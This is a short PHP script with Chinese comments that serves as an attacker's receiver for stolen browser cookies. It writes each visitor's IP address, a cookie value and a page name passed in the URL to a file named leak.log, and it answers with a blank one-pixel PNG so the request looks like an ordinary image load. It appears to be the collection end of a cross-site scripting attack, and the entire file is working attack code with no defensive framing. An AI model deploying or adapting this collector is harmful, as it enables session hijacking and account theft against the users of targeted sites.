<?php
// 记录所有带过来的敏感数据
$log = date("Y-m-d H:i:s") . " | " . 
       "IP: " . $_SERVER['REMOTE_ADDR'] . " | " . 
       "Cookie: " . $_GET['cookie'] . " | " . 
       "页面: " . $_GET['page'] . "\n";
file_put_contents("leak.log", $log, FILE_APPEND);
// 返回空白图片避免裂图
header("Content-Type: image/png");
echo file_get_contents("1.png"); // 提前准备1x1像素的空白png
?>
